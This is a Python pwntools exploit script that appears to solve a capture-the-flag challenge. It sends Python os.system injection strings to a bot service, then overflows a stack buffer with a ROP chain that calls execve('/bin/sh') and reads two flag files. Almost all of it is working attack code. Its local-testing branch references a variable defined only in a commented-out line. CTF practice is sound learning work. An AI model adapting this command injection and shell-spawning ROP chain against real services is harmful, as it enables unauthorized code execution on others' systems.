#!/usr/bin/python
from pwn import *

HOST = "127.0.0.1"
PORT = 7000

rsp_offset = 8
remote_path = "/bot/delete-me-asap/{}"

def pwn_bot(r, path):
    payload = ''
    payload += 'cat flag'

    sh = "(__import__('os').system('{}'))"
    get_binary = sh.format('base64\x20{}'.format(path))
    run_binary = sh.format(path)

    # Get first flag
    r.recv(2048) # toss banner
    r.sendline() # extra newline needed for remote
    r.sendline(payload)
    flag1 = r.recvline()

    """# Get ELF via base64
    log.info("Grabbing binary...")
    log.info("Payload: {}".format(get_binary))
    r.sendline(get_binary)
    r.interactive()
    print r.recv(4096)"""

    # Start ELF
    log.info("Sending payload: {}".format(run_binary))
    r.sendline(run_binary)
    log.info("Exploiting binary...")
    log.info("Flag1: {}".format(flag1.split()[1]))

    if path == "./challenge":
        flag_path = "./src/flag2"
    else:
        flag_path = remote_path.format("flag")
    exploit(r, flag_path)

def exploit(r, flag):
    rop = ''
    rop += p64(binary.symbols['set_rdi'])
    rop += p64(binary.symbols['binsh'])

    rop += p64(binary.symbols['set_rsi'])
    rop += p64(0x0)        #set argv to NULL

    rop += p64(binary.symbols['set_rdx'])
    rop += p64(0x0)        #set envp to NULL

    rop += p64(binary.symbols['set_rax'])
    rop += p64(0x3b)       #set rax to 59 for execve
    rop += p64(binary.symbols['do_syscall'])

    payload = ''
    payload += 'A'*rsp_offset
    payload += rop

    r.recvuntil(': ')
    r.sendline(payload)

    # Grab flag
    r.recv(2048) #toss junk
    r.sendline("cat {}".format(flag))
    flag2 = r.recvline()

    log.info("Flag2: {}".format(flag2))
    return

if __name__ == "__main__":
    #name = './src/run.py' #uncomment for local testing
    binary_name = './challenge'
    binary = ELF(binary_name)
    context.terminal=["tmux", "sp", "-h"]

    if len(sys.argv) > 1:
        r = remote(HOST,PORT)
        binary_path = remote_path.format("challenge")
    else:
        r = process(name, env={})
        binary_path = binary_name
    pwn_bot(r,binary_path)
